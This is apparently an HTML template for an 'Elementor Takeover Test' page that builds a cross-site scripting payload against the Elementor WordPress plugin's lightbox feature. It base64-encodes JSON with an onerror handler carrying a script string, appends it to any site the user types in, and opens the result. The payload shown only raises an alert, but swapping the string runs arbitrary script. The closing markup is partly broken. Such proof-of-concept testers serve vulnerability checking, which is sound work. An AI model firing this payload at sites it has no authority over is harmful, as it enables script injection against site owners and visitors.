<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8"/>
    <meta name="viewport"
          content="width=device-width,
        initial-scale=1"/>

    <!-- Bootstrap CSS -->
    <link
            href=
                    "https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity=
                    "sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl"
            crossorigin="anonymous"
    />
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <link rel="preconnect"
          href="https://fonts.gstatic.com"/>
    <link
            href=
                    "https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"
            rel="stylesheet"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
    <script type="text/javascript">
        const jspayload = "alert('hello')";
        const base64 = btoa(JSON.stringify({
            "type": "video",
            "url": "http://",
            "videoType": "hosted",
            "videoParams": {
                "onerror": jspayload,
                "style": "    background-color: white;" +
                    "background-image: url(https://nerdist.com/wp-content/uploads/2020/07/maxresdefault.jpg);" +
                    "background-size: contain;"
            }
        }))

        const payload = '/#elementor-action:action=lightbox&settings=' + base64;

        $(function () {
            $("#website").val(location.hash.substr(1))
        });

        function checkSite() {

            let url = $("#website").val();
            if (!/^https?:\/\//i.test(url)) {
                url = 'https://' + url;
            }
            url = url + payload;

            window.open(url, '_blank');
        }
    </script>

    <title>Elementor Takeover Test</title>
</head>
<body>
<section id="navbar">
    <nav class="navbar navbar-expand-lg navbar-light">
        <div class="container-fluid" style="justify-content: center">
            <a class="navbar-brand" href="#">
                All your Elementor are belong to us
            </a>

    </nav>
</section>

<!-- banner -->
<section id="banner">
    <div class="container-fluid" id="banner-container">
        <div class="row" id="banner-row">
            <div class="col-md-12" id="banner-col">
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text">Website</span>
                    </div>
                    <input type="text" class="form-control" placeholder="website" aria-label="website"
                           aria-describedby="basic-addon1" id="website"/>
                    <button onclick="checkSite()" type="button" class="btn btn-danger">Check</button>
                </div>
            </div>
        </div>
    </div>
</section>


<!-- footer -->
<section id="footer">
    <section id="banner">
        <div class="container-fluid" id="banner-container">
            <div class="row" id="banner-row">
                <div class="col-md-12" id="footer-col1">
                    <h3 style="text-decoration: underline;">Brought to you by</h3>

                    <p>
                        Rotem Bar - @Trhacknon Security
                    </p>
                    <p>
                        anonymous - rainbow hat
                    </p>
                    <p>
            
                    </p>


                </div>

            </div>
    </section>
</section>

        src=
                "https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"
        integrity=
                "sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0"
        crossorigin="anonymous"
></script>
</body>
</html>
